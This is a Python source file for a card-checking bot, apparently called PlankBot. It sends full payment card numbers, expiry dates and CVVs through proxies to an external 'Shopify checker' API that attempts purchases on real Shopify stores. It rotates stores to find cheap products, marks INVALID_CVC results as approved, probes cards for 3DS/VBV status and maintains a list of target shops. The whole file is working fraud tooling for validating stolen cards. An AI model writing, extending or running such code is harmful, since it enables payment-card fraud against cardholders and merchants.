"""
Plank — Gate checker wrappers.
Calls the external Shopify checker API.
"""

import asyncio
import aiohttp
import time

from config import CHECKER_API_URL, MAX_PRICE

# (Concurrency Limiter removed as it was causing global bottlenecking)

# ── Priority Queue/Yielding for Diamond & Bedrock ─────
_active_priority_checks = 0

def register_priority_check_start():
    global _active_priority_checks
    _active_priority_checks += 1

def register_priority_check_end():
    global _active_priority_checks
    if _active_priority_checks > 0:
        _active_priority_checks -= 1

async def wait_if_low_priority():
    # Disabled to prevent starvation of low priority users
    pass


# ── Shared session for API calls ─────────────────────

_api_session: aiohttp.ClientSession | None = None
_api_timeout = aiohttp.ClientTimeout(total=30)


async def _get_api_session() -> aiohttp.ClientSession:
    global _api_session
    if _api_session is None or _api_session.closed:
        _api_session = aiohttp.ClientSession(
            timeout=_api_timeout,
            connector=aiohttp.TCPConnector(
                limit=300,
            )
        )
    return _api_session


def _error_result(cc, month, year, cvv, response, gate="Shopify", price="0.00",
                  charged="False", approved="False", elapsed=0.0):
    return {
        "Response": response,
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "Price": price,
        "Gate": gate,
        "Site": "",
        "Charged": charged,
        "Approved": approved,
        "Time": f"{elapsed}s",
    }


# ── Shopify checker (via external API) ───────────────

async def check_shopify(cc: str, month: str, year: str, cvv: str,
                        site: str = "", proxy: str = None, is_priority: bool = False) -> dict:
    """Call the external Shopify checker API.
    API format: GET {CHECKER_API_URL}/shopify?site={site}&cc={cc}|{mm}|{yy}|{cvv}&proxy={proxy}
    """
    if is_priority:
        register_priority_check_start()
    else:
        await wait_if_low_priority()

    try:
        card_str = f"{cc}|{month}|{year}|{cvv}"
        
        import random
        
        async def _do_request(current_site: str) -> dict:
            start_time = time.time()
            params = {"cc": card_str, "max_price": str(MAX_PRICE)}
            if current_site:
                url_site = current_site if current_site.startswith("http") else f"https://{current_site}"
                params["site"] = url_site
            if proxy:
                params["proxy"] = proxy

            try:
                session = await _get_api_session()
                async with session.get(
                    f"{CHECKER_API_URL}/shopify",
                    params=params,
                ) as resp:
                    elapsed = round(time.time() - start_time, 1)
                    if resp.status == 200:
                        data = await resp.json()
                        return {
                            "Response": data.get("card_response", data.get("Response", "CARD_DECLINED")),
                            "CC": card_str,
                            "Price": data.get("price", data.get("Price", "0.00")),
                            "Gate": data.get("gate", data.get("Gate", "Shopify Payments")),
                            "Site": data.get("site", data.get("Site", current_site)),
                            "Charged": str(data.get("charged", data.get("Charged", "False"))),
                            "Approved": str(data.get("approved", data.get("Approved", "False"))),
                            "Time": data.get("time", f"{elapsed}s"),
                        }
                    else:
                        resp_text = await resp.text()
                        with open("/root/projects/PlankBot/error.log", "a") as f:
                            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Bad HTTP status: {resp.status} response: {resp_text[:500]}\n")
                    return _error_result(cc, month, year, cvv, "API_ERROR", elapsed=elapsed)
            except asyncio.TimeoutError:
                elapsed = round(time.time() - start_time, 1)
                return _error_result(cc, month, year, cvv, "TIMEOUT", elapsed=elapsed)
            except Exception as e:
                import traceback
                with open("/root/projects/PlankBot/error.log", "a") as f:
                    f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] Request Exception: {str(e)}\n{traceback.format_exc()}\n")
                elapsed = round(time.time() - start_time, 1)
                return _error_result(cc, month, year, cvv, "API_ERROR", elapsed=elapsed)

        current_site = site
        result = await _do_request(current_site)
        
        def _is_site_error(resp: str) -> bool:
            """Check if the response is a site-level error that can be resolved by rotating sites."""
            r = resp.upper()
            return "PRODUCT_OVER_MAIN" in r or "PRICE_OVER_MAX" in r or "NO_PRODUCT" in r or "NO PRODUCT" in r
        
        response = result.get("Response", "CARD_DECLINED")
        if _is_site_error(response):
            sites = await get_shopify_sites()
            visited_sites = {current_site}
            
            # Up to 2 retries across unique different sites to find a cheap enough product
            for _ in range(2):
                other_sites = [s for s in sites if s not in visited_sites]
                if not other_sites:
                    break
                current_site = random.choice(other_sites)
                visited_sites.add(current_site)
                
                result = await _do_request(current_site)
                response = result.get("Response", "CARD_DECLINED")
                if not _is_site_error(response):
                    break
            
            if _is_site_error(response):
                result["Response"] = "NO_PRODUCT"
        
        # Mask INVALID_CVC as 3DS_REQUIRED and mark as approved
        final_response = result.get("Response", "CARD_DECLINED")
        if "INVALID_CVC" in final_response.upper():
            result["Response"] = "3DS_REQUIRED"
            result["Approved"] = "True"
            
        return result
    finally:
        if is_priority:
            register_priority_check_end()


# ── Site checker (via external API) ──────────────────

async def check_site(site: str) -> dict:
    """Check a site via the external API.
    Uses the /shopify endpoint with a test card to bypass the HTTP 400 error.
    """
    import os, random
    test_card = "4111111111111111|12|2030|123"
    if os.path.exists("site_cards.txt"):
        try:
            with open("site_cards.txt", "r") as f:
                cards = [l.strip() for l in f if l.strip()]
            if cards:
                test_card = random.choice(cards)
        except Exception:
            pass

    url_site = site if site.startswith("http") else f"https://{site}"
    try:
        session = await _get_api_session()
        async with session.get(
            f"{CHECKER_API_URL}/shopify",
            params={
                "site": url_site,
                "cc": test_card,
                "max_price": str(MAX_PRICE)
            },
            timeout=aiohttp.ClientTimeout(total=30),
        ) as resp:
            if resp.status == 200:
                data = await resp.json()
                resp_str = data.get("Response", data.get("card_response", "UNKNOWN")).upper()
                price_str = data.get("Price", data.get("price", "0.00"))
                try:
                    price_val = float(str(price_str).replace('$', '').replace(',', ''))
                except ValueError:
                    price_val = 0.0

                valid_responses = ("CARD_DECLINED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS", "DO_NOT_HONOR")
                
                is_valid = (
                    any(v in resp_str for v in valid_responses)
                    and price_val <= MAX_PRICE
                )

                return {
                    "valid": is_valid,
                    "site": site,
                    "card_response": resp_str,
                    "price": price_str,
                    "time": data.get("Time", data.get("time", "0s")),
                    "gate": data.get("Gate", data.get("gate", "UNKNOWN"))
                }
            return {"valid": False, "site": site, "error": f"HTTP_{resp.status}"}
    except asyncio.TimeoutError:
        return {"valid": False, "site": site, "error": "TIMEOUT"}
    except Exception as e:
        return {"valid": False, "site": site, "error": str(e)[:50]}


# ── VBV checker ──────────────────────────────────────

_sites_cache = None
_sites_lock = asyncio.Lock()


def _load_shopify_sites_sync() -> list[str]:
    import os
    from config import SHOPIFY_SITES_FILE
    if not os.path.exists(SHOPIFY_SITES_FILE):
        return ["kyliebaby.com"]
    try:
        with open(SHOPIFY_SITES_FILE) as f:
            return [l.strip() for l in f if l.strip()]
    except Exception:
        return ["kyliebaby.com"]


async def get_shopify_sites() -> list[str]:
    global _sites_cache
    if _sites_cache is not None:
        return _sites_cache
    async with _sites_lock:
        if _sites_cache is None:
            _sites_cache = await asyncio.to_thread(_load_shopify_sites_sync)
    return _sites_cache


def invalidate_sites_cache():
    global _sites_cache
    _sites_cache = None


async def remove_shopify_site(site_to_remove: str):
    global _sites_cache
    if not site_to_remove:
        return
    async with _sites_lock:
        sites = await get_shopify_sites()
        
        def clean(s):
            s = s.lower().strip()
            if s.startswith("https://"): s = s[8:]
            if s.startswith("http://"): s = s[7:]
            if s.endswith("/"): s = s[:-1]
            return s
            
        target = clean(site_to_remove)
        new_sites = [s for s in sites if clean(s) != target]
        
        if len(new_sites) < len(sites):
            _sites_cache = new_sites
            # Update the file on disk as well
            try:
                import os
                from config import SHOPIFY_SITES_FILE
                def _write_file():
                    with open(SHOPIFY_SITES_FILE, "w") as f:
                        f.write("\n".join(new_sites) + "\n" if new_sites else "")
                await asyncio.to_thread(_write_file)
            except Exception:
                pass


async def check_vbv(cc: str, month: str, year: str, cvv: str,
                    proxy: str = None, is_priority: bool = False) -> dict:
    """Check if a card requires 3DS / VBV authentication.
    Uses the Shopify gate as a lightweight probe.
    """
    import random
    sites = await get_shopify_sites()
    site = random.choice(sites) if sites else "kyliebaby.com"
    for attempt in range(2):
        result = await check_shopify(cc, month, year, cvv, site=site, proxy=proxy, is_priority=is_priority)
        response = result.get("Response", "")
        if "API_ERROR" not in response.upper() or attempt == 1:
            break
        site = random.choice(sites) if sites else site
    is_vbv = response in ("3DS_REQUIRED", "AUTHENTICATION_REQUIRED")
    return {
        "CC": f"{cc}|{month}|{year}|{cvv}",
        "VBV": "Yes" if is_vbv else "No",
        "Response": response,
    }
